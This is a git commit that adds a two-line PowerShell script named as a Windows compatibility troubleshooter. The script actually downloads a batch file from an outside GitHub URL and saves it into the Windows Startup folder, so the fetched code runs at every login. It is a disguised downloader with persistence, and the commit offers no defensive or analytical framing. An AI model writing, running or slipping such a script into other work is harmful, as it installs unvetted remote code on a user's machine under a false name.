97b9e5fa4276e0f82a0071045392124155055df9
LionHackerman <58070003+LionHackerman@users.noreply.github.com>
2021-11-02 10:06:34 +1100

    Add files via upload

---
+++ Windows Combatability Troubleshooter.ps1
@@ -0,0 +1,2 @@
+$client = new-object System.Net.WebClient
+$client.DownloadFile("http://www.github.com/lionhackerman/whip/WindowsCompatibilityTroubeshooter.bat","C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsCompatibilityTroubeshooter.bat")
